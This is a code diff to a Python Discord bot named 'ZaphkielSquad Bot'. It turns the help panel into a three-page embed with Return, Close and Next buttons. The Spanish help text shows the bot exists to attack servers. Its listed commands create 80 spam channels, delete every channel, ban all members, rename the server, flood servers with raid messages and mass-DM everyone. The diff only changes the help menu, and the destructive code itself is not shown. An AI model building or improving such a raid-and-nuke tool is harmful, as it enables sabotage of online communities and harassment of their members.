@@ -359,7 +359,7 @@ async def sv(ctx):
 
 paginas = [
     {
-        "title": "Panel de ayuda de ZaphkielSquad Bot",
+        "title": "Panel de ayuda ZaphkielSquad / Bot - Page 1",
         "descripcion": (
             "`$hlp` –\n"
             "**Muestra este panel de ayuda.**\n"
@@ -370,7 +370,12 @@ paginas = [
             "`$raid` –\n"
             "**Crea una cantidad de 80 canales.**\n"
             "`$nuke` –\n"
-            "**Borra todos los canales del servidor.**\n"
+            "**Borra todos los canales del servidor.**"
+        )
+    },
+    {
+        "title": "Panel de ayuda ZaphkielSquad / Bot - Page 2",
+        "descripcion": (
             "`$cn` –\n"
             "**Cambia el nombre del servidor.**\n"
             "`$cr (cantidad)` –\n"
@@ -380,7 +385,12 @@ paginas = [
             "`$ret` –\n"
             "**Raidea creando muchos canales con spam.**\n"
             "`$bn` –\n"
-            "**Banea a todos los miembros excepto bots con admin.**\n"
+            "**Banea a todos los miembros excepto bots con admin.**"
+        )
+    },
+    {
+        "title": "Panel de ayuda ZaphkielSquad / Bot - Page 3",
+        "descripcion": (
             "`$wbh` –\n"
             "**Envía repetidas veces un mensaje de raid.**\n"
             "`$dr` –\n"
@@ -390,25 +400,53 @@ paginas = [
             "`$vs (ID servidor)` –\n"
             "**Raidea solo si el Bot está dentro del servidor.**\n"
             "`$md` –\n"
-            "**Envía un MD a todos con el link del bot.**\n"
+            "**Envía un MD a todos con el link del bot.**"
         )
     }
 ]
+
+class HelpView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=120)
+        self.page = 0
+
+    def get_embed(self):
+        data = paginas[self.page]
+
+        embed = discord.Embed(title=data["title"], description=data["descripcion"], color=0x6E0F0F)
+
+        embed.set_thumbnail(url="https://i.postimg.cc/VLn8Vfbs/Imagen-de-Chat-GPT-15-nov-2026-07-20-08-p-m.png")
+
+        embed.set_footer(text=f"Página {self.page + 1}/{len(paginas)}")
+
+        return embed
+
+    @discord.ui.button(label="Return", style=discord.ButtonStyle.gray)
+    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.page -= 1
+
+        if self.page < 0:
+            self.page = len(paginas) - 1
+
+        await interaction.response.edit_message(embed=self.get_embed(), view=self)
+
+    @discord.ui.button(label="Close", style=discord.ButtonStyle.gray)
+    async def close(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.message.delete()
+
+    @discord.ui.button(label="Next", style=discord.ButtonStyle.gray)
+    async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.page += 1
+
+        if self.page >= len(paginas):
+            self.page = 0
+
+        await interaction.response.edit_message(embed=self.get_embed(), view=self)
+
 @bot.command()
 async def hlp(ctx):
-    page = paginas[0]
-
-    embed = discord.Embed(
-        title=page["title"],
-        description=page["descripcion"],
-        color=0x6E0F0F
-    )
-
-    embed.set_thumbnail(
-        url="https://i.postimg.cc/VLn8Vfbs/Imagen-de-Chat-GPT-15-nov-2026-07-20-08-p-m.png"
-    )
-
-    await ctx.send(embed=embed)
+    view = HelpView()
+    await ctx.send(embed=view.get_embed(), view=view)
 
 webserver.keep_alive()
 bot.run(DISCORD_TOKEN)
